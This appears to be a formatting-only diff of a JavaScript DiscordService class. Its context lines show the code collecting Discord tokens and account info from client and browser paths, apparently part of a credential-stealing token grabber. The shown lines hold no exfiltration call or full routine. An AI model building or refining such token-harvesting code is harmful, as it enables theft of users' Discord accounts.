@@ -131,7 +131,7 @@ class DiscordService {
                         });
                     }
                 } catch (error) {
-                    logger.debug(`Failed to get account info for token`, error.message);
+                    logger.debug('Failed to get account info for token', error.message);
                 }
             }
 
@@ -143,7 +143,7 @@ class DiscordService {
                 stats.addDiscordAccount(account);
             }
 
-            logger.info(`Discord account collection completed`, {
+            logger.info('Discord account collection completed', {
                 totalAccounts: accounts.length,
                 totalUniqueTokens: uniqueTokensSet.size,
                 clients: Object.keys(this.discordPaths).length
@@ -184,8 +184,8 @@ Reason: This could happen for several reasons:
 
 Searched Clients:
 ${Object.entries(this.discordPaths).map(([key, config]) => 
-    `- ${config.name}: ${config.basePaths.join(', ')}`
-).join('\n')}
+        `- ${config.name}: ${config.basePaths.join(', ')}`
+    ).join('\n')}
 
 Browser Paths Searched: ${this.browserService.getBrowserPaths().length} locations
 
